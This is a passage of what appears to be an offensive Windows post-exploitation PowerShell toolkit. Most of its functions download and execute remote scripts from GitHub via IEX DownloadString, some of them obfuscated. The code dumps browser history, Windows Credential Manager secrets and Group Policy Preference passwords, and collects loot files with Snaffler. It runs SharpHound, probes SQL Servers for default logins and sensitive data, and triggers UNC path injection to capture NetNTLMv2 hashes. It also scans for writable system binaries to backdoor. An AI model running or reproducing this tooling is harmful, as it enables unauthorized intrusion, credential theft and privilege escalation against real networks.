    if (!$noninteractive){$browserinfos = Read-Host -Prompt 'Dump all installed Browser history and bookmarks? (yes/no)'}
    if ($browserinfos -eq "yes" -or $browserinfos -eq "y" -or $browserinfos -eq "Yes" -or $browserinfos -eq "Y")
    {
        # Stolen from Steve Borosh @rvrsh3ll
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-BrowserInformation.ps1')
        if(!$consoleoutput){Get-BrowserInformation | out-string -Width 4096 >> "$currentPath\LocalRecon\AllBrowserHistory.txt"}else{Get-BrowserInformation | out-string -Width 4096}
    }
}

{
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
        Switch ($masterquestion) 
        {
             1{passhunt -domain $true}
             2{Snaffler}
       }
    }
 While ($masterquestion -ne 3)

}

function Snaffler
{    
    [CmdletBinding()]
    Param
    (   
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName    
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Snaffler.ps1')
    if (!$noninteractive)
    {
        Write-Host -ForegroundColor Yellow "Get a copy of all found files to the loot folder?"
        $answer = Read-Host
	    if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
	    {
		    mkdir $currentPath\LootFiles
        	    if(!$consoleoutput){Invoke-Snaffler -command "-u -s -m $currentPath\LootFiles\ -o $currentPath\DomainRecon\Snaffler.txt"}else{Invoke-Snaffler -command "-u -s -m $currentPath\LootFiles\"}
	    }
	    else
	    {
		    if(!$consoleoutput){Invoke-Snaffler -command "-u -s -o $currentPath\DomainRecon\Snaffler.txt"}else{Invoke-Snaffler -command "-u -s "}
	    }
    }
    else
    {
    	Invoke-Snaffler -command "-u"
    }
}

function oxidresolver
{
    [CmdletBinding()]
    Param
    (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput
    )
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-OxidResolver.ps1')
    if(!$consoleoutput){pathcheck}
    if(!$consoleoutput){Invoke-Oxidresolver >> "$currentPath\DomainRecon\OxidBindings.txt"}
    else{Invoke-Oxidresolver}
}                   
function reconAD
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    # sense-of-security - ADRecon
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    # todo interactive
    Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
    Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
    cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
}
function PowerSQL
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    Write-Host -ForegroundColor Yellow 'Searching for SQL Server instances in the domain:'
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/PowerUpSQL.ps1')
    if(!$consoleoutput){Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\SQLServers.txt"}      
    $Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"} 
    if(!$consoleoutput){$Targets >> "$currentPath\DomainRecon\SQLServer_Accessible.txt"}else{Write-Host -ForegroundColor Yellow '-------> Accessible SQL Servers';$Targets}
    if(!$consoleoutput){$Targets.Instance >> "$currentPath\DomainRecon\SQLServer_AccessibleInstances.txt"}else{Write-Host -ForegroundColor Yellow '-------> Accessible Instances';$Targets.Instance}       
    if(!$consoleoutput){Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\Vulnerabilities\SQLServer_DefaultLogin.txt"}else{Write-Host -ForegroundColor Yellow '-------> Default Logins';Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose}  
        foreach ($line in $Targets.Instance)
    {
        if(!$consoleoutput){
            Get-SQLServerInfo -Verbose -Instance $line >> "$currentPath\DomainRecon\SQLServer_Accessible_GeneralInformation.txt"
            Invoke-SQLDumpInfo -Verbose -Instance $line $line >> "$currentPath\DomainRecon\SQLServer_Accessible_DumpInformation.txt"
	        $SQLComputerName = $Targets.Computername
            Invoke-SQLAudit -Verbose -Instance $line >> "$currentPath\Vulnerabilities\SQLServer_Accessible_Audit_$SQLComputerName.txt"
	        Get-SQLServerLinkCrawl -verbose -instance "$line" >> "$currentPath\Vulnerabilities\SQLServerLinks_Pot_LateralMovement.txt"
            mkdir "$currentPath\DomainRecon\SQLInfoDumps"
            $Targets | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "password,pass,credit,ssn,pwd" -SampleSize 2 -ValidateCC -NoDefaults >> "$currentPath\DomainRecon\SQLServer_Accessible_PotentialSensitiveData.txt" 
        }
        else
        {    
            Get-SQLServerInfo -Verbose -Instance $line
            Invoke-SQLDumpInfo -Verbose -Instance $line
	        $SQLComputerName = $Targets.Computername    
            Invoke-SQLAudit -Verbose -Instance $line 
               Get-SQLServerLinkCrawl -verbose -instance "$line"
        }
    }
    if(!$consoleoutput){
        move *.csv "$currentPath\DomainRecon\SQLInfoDumps\"
        $uncpath = "no"
        if (!$noninteractive){$uncpath = Read-Host -Prompt 'Execute UNC-Path Injection tests for accesible SQL Servers to gather some Netntlmv2 Hashes? (yes/no)'}
        if ($uncpath -eq "yes" -or $uncpath -eq "y" -or $uncpath -eq "Yes" -or $uncpath -eq "Y")
        {
            $responder = Read-Host -Prompt 'Do you have Responder.py running on another machine in this network? (If not we can start inveigh) - (yes/no)'
            if ($responder -eq "yes" -or $responder -eq "y" -or $responder -eq "Yes" -or $responder -eq "Y")
            {
                $smbip = Read-Host -Prompt 'Please enter the IP-Address of the hash capturing Network Interface:'
	            Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip
            }
            else
            {
                $smbip = Get-currentIP
                Inveigh
	            Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip.IPv4Address.IPAddress
            }    
        }
    }
          
}

function Get-currentIP
{      
    #Domain Recon / Lateral Movement Phase
    $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}
    return $IPaddress
}
function Sharphound
{
    #Domain Recon / Lateral Movement Phase
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    $Wcl = new-object System.Net.WebClient
    $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharphound3.ps1')
    Write-Host -ForegroundColor Yellow 'Running Sharphound Collector: '
    Invoke-Sharphound3
}

function oldchecks
{
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    # Sherlock script, P0werUp Scipt, Get-GPP Scripts from p0werspl0it + credential manager dump
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/locksher.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/UpPower.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/GPpass.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/AutoGP.ps1')
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
        Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
        if(Test-Path $currentPath\Exploitation\WCMCredentials.txt){ $out = Get-Content $currentPath\Exploitation\WCMCredentials.txt; $out}

        Write-Host -ForegroundColor Yellow 'Getting Local Privilege Escalation possibilities:'

        Write-Host -ForegroundColor Yellow 'Getting GPPPasswords:'
        amazon >> $currentPath\Vulnerabilities\GPP_Auto.txt
        if(Test-Path $currentPath\Vulnerabilities\GPP_Auto.txt){ $out = Get-Content $currentPath\Vulnerabilities\GPP_Auto.txt; $out}
        Shockley >> $currentPath\Vulnerabilities\GPP_Passwords.txt
        if(Test-Path $currentPath\Vulnerabilities\GPP_Passwords.txt){ $out = Get-Content $currentPath\Vulnerabilities\GPP_Passwords.txt; $out}

        Write-Host -ForegroundColor Yellow 'Looking for Local Privilege Escalation possibilities:'
        try{    
        families >> $currentPath\LocalPrivEsc\All_Localchecks.txt
        $out = Get-Content $currentPath\LocalPrivEsc\All_Localchecks.txt; $out}
        catch{}

        Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc:'
        try{
        proportioned >> $currentPath\Vulnerabilities\Sherlock_Vulns.txt
        if(Test-Path $currentPath\Vulnerabilities\Sherlock_Vulns.txt){ $out = Get-Content $currentPath\Vulnerabilities\Sherlock_Vulns.txt; $out}}
        catch{}
    }
    else
    {
        Write-Host -ForegroundColor Yellow '-------> WCMDump:'
        Invoke-WCMDump
        Write-Host -ForegroundColor Yellow '-------> Getting Local Privilege Escalation possibilities:'

        Write-Host -ForegroundColor Yellow '-------> Getting GPPPasswords:'
        amazon 
        Shockley 
        
        Write-Host -ForegroundColor Yellow '-------> Looking for Local Privilege Escalation possibilities:'
        try{    
        families
        } 
        catch{}

        Write-Host -ForegroundColor Yellow '-------> Looking for MS-Exploits on this local system for Privesc:'
        try{
        proportioned
        }catch{}

    }
}

function itm4nprivesc
{
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    # Stolen and obfuscated from https://github.com/itm4n/PrivescCheck
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-Privesc.ps1')
    if(!$consoleoutput)
    {
        Invoke-PrivescCheck -Extended -Report PrivescCheck -Format CSV,HTML,TXT
        Move-Item $currentPath\PrivescCheck* "$currentPath\LocalPrivEsc\"
    }
    else
    {
        Write-Host -ForegroundColor Yellow '-------> Invoke-Privesc Checks'
        Invoke-PrivescCheck -Extended
    }
}

function otherchecks
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    $groups = 'Users,Everyone,Authenticated Users'
    $arguments = $groups.Split(",")
    $whoami = whoami
    
    if(!$consoleoutput){wmic qfe get InstalledOn | Sort-Object { $_ -as [datetime] } | Select -Last 1 >> $currentPath\LocalPrivEsc\LastPatchDate.txt}else{Write-Host -ForegroundColor Yellow '-------> Last Patch Date';wmic qfe get InstalledOn | Sort-Object { $_ -as [datetime] } | Select -Last 1}
    
    # Stolen somewhere.

    if(!$consoleoutput){

        Write "Checking if SCCM is installed - installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading:"
        $result = $null
        $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
        if ($result) { $result >> $currentPath\LocalPrivEsc\SCCM_DLLSiteloading.txt }
        else { Write "Not Installed." }
        
        Write "Checking privileges - rotten potato:"
        $result = $null
        $result = (whoami /priv | findstr /i /C:"SeImpersonatePrivilege" /C:"SeAssignPrimaryPrivilege" /C:"SeTcbPrivilege" /C:"SeBackupPrivilege" /C:"SeRestorePrivilege" /C:"SeCreateTokenPrivilege" /C:"SeLoadDriverPrivilege" /C:"SeTakeOwnershipPrivilege" /C:"SeDebugPrivilege" 2> $null) | Out-String
        if ($result) { Write $result; $result >> $currentPath\LocalPrivEsc\RottenPotatoVulnerable.txt} else { Write "User privileges do not allow for rotten potato exploit." }
        
        Write "System32 directory permissions - backdoor windows binaries:"
        $result = $null
        $result = (Get-Acl C:\Windows\system32).Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\System32directoryWritePermissions.txt } else { Write "Permissions set on System32 directory are correct for all groups." }
        
        Write "System32 files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem C:\Windows\system32 -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\System32fileWritePermissions.txt } else { Write "Permissions set on System32 files and directories are correct for all groups." }
        
        Write "Program Files directory permissions - backdoor windows binaries:"
        $result = $null
        $result = (Get-Acl "$env:ProgramFiles").Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        $result += (Get-Acl ${env:ProgramFiles(x86)}).Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\ProgramDirectoryWritePermissions.txt } else { Write "Permissions set on Program Files directory are correct for all groups." }
        
        Write "Program Files files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem "$env:ProgramFiles" -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        $result += Get-ChildItem ${env:ProgramFiles(x86)} -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique ; $result >> $currentPath\LocalPrivEsc\ProgramBinaryWritePermissions.txt } else { Write "Permissions set on Program Files files and directories are correct for all groups." }
            
        Write "ProgramData files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem "$env:ProgramData" -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\ProgramDataDirectoryPermissions.txt} else { Write "Permissions set on ProgramData files and directories are correct for all groups." }
    
        Write "Scheduled process binary permissions - backdoor binary:"
        $result = $null
        $result = schtasks /query /fo LIST /V | findstr "\\" | findstr "\." | % { Trap { Continue } $o = $_.Split(" "); $obj = $o[30..($o.Length-1)] -join (" "); If ($obj -like '"*"*') { $o = $obj.split('"')[1] } ElseIf ($obj -like '* -*') { $o = $obj.split('-')[0] } ElseIf ($obj -like '* /*') { $o = $obj.split('/')[0] } Else { $o = $obj }; If ($o -like '*%*%*') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace("%$var%",$out) }; (Get-Acl $o 2> $null).Access } | ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique ; $result >> $currentPath\LocalPrivEsc\ScheduledProcessBinaryPermissions.txt } else { Write "Permissions set on scheduled binaries are correct for all groups." }
            
        
        Write "Scheduled process directory permissions - try DLL injection:"
        $result = $null
        $result = schtasks /query /fo LIST /V | findstr "\\" | findstr "\." | % { Trap { Continue } $o = $_.Split(" "); $obj = $o[30..($o.Length-1)] -join (" "); If ($obj -like '"*"*') { $o = $obj.split('"')[1] } ElseIf ($obj -like '* -*') { $o = $obj.split('-')[0] } ElseIf ($obj -like '* /*') { $o = $obj.split('/')[0] } Else { $o = $obj }; If ($o -like '*%*%*') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace("%$var%",$out) }; $obj = $o.Split("\"); $o = $obj[0..($obj.Length-2)] -join ("\"); (Get-Acl $o 2> $null).Access } | ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\ScheduledProcessDirectoryPermissions.txt } else { Write "Permissions set on scheduled binary directories are correct for all groups." }
                
        
        Write "Loaded DLLs permissions - backdoor DLL:"
        $result = $null
        $result = ForEach ($item in (Get-WmiObject -Class CIM_ProcessExecutable)) { [wmi]"$($item.Antecedent)" | Where-Object {$_.Extension -eq 'dll'} | Select Name | ForEach-Object { $o = $_.Name; (Get-Acl $o 2> $null).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\WriteDLLPermission.txt } else { Write "Permissions set on loaded DLLs are correct for all groups." }
     }
     else
     {
        Write "-------> Checking if SCCM is installed - installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading:"
        $result = $null
        $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
        if ($result) { $result }
        else { Write "Not Installed." }
        
        Write "-------> Checking privileges - rotten potato:"
        $result = $null
        $result = (whoami /priv | findstr /i /C:"SeImpersonatePrivilege" /C:"SeAssignPrimaryPrivilege" /C:"SeTcbPrivilege" /C:"SeBackupPrivilege" /C:"SeRestorePrivilege" /C:"SeCreateTokenPrivilege" /C:"SeLoadDriverPrivilege" /C:"SeTakeOwnershipPrivilege" /C:"SeDebugPrivilege" 2> $null) | Out-String
        if ($result) { Write $result; $result } else { Write "User privileges do not allow for rotten potato exploit." }
        
        Write "-------> System32 directory permissions - backdoor windows binaries:"
        $result = $null
        $result = (Get-Acl C:\Windows\system32).Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on System32 directory are correct for all groups." }
        
        Write "-------> System32 files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem C:\Windows\system32 -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on System32 files and directories are correct for all groups." }
        
        Write "-------> Program Files directory permissions - backdoor windows binaries:"
        $result = $null
        $result = (Get-Acl "$env:ProgramFiles").Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        $result += (Get-Acl ${env:ProgramFiles(x86)}).Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on Program Files directory are correct for all groups." }
        
        Write "-------> Program Files files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem "$env:ProgramFiles" -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        $result += Get-ChildItem ${env:ProgramFiles(x86)} -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique ; $result } else { Write "Permissions set on Program Files files and directories are correct for all groups." }
            
        Write "-------> ProgramData files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem "$env:ProgramData" -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on ProgramData files and directories are correct for all groups." }
    
        Write "-------> Scheduled process binary permissions - backdoor binary:"
        $result = $null
        $result = schtasks /query /fo LIST /V | findstr "\\" | findstr "\." | % { Trap { Continue } $o = $_.Split(" "); $obj = $o[30..($o.Length-1)] -join (" "); If ($obj -like '"*"*') { $o = $obj.split('"')[1] } ElseIf ($obj -like '* -*') { $o = $obj.split('-')[0] } ElseIf ($obj -like '* /*') { $o = $obj.split('/')[0] } Else { $o = $obj }; If ($o -like '*%*%*') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace("%$var%",$out) }; (Get-Acl $o 2> $null).Access } | ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique ; $result } else { Write "Permissions set on scheduled binaries are correct for all groups." }
            
        
        Write "-------> Scheduled process directory permissions - try DLL injection:"
        $result = $null
        $result = schtasks /query /fo LIST /V | findstr "\\" | findstr "\." | % { Trap { Continue } $o = $_.Split(" "); $obj = $o[30..($o.Length-1)] -join (" "); If ($obj -like '"*"*') { $o = $obj.split('"')[1] } ElseIf ($obj -like '* -*') { $o = $obj.split('-')[0] } ElseIf ($obj -like '* /*') { $o = $obj.split('/')[0] } Else { $o = $obj }; If ($o -like '*%*%*') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace("%$var%",$out) }; $obj = $o.Split("\"); $o = $obj[0..($obj.Length-2)] -join ("\"); (Get-Acl $o 2> $null).Access } | ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on scheduled binary directories are correct for all groups." }
                
        
        Write "-------> Loaded DLLs permissions - backdoor DLL:"
        $result = $null
        $result = ForEach ($item in (Get-WmiObject -Class CIM_ProcessExecutable)) { [wmi]"$($item.Antecedent)" | Where-Object {$_.Extension -eq 'dll'} | Select Name | ForEach-Object { $o = $_.Name; (Get-Acl $o 2> $null).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on loaded DLLs are correct for all groups." }
     }    
     if(!$consoleoutput){
        Write "Files that may contain passwords:"
        $i = 0
        if (Test-Path $env:SystemDrive\sysprep.inf) { Write "$env:SystemDrive\sysprep.inf" >> $currentPath\LocalPrivEsc\Passwordfiles.txt  ; $i = 1}
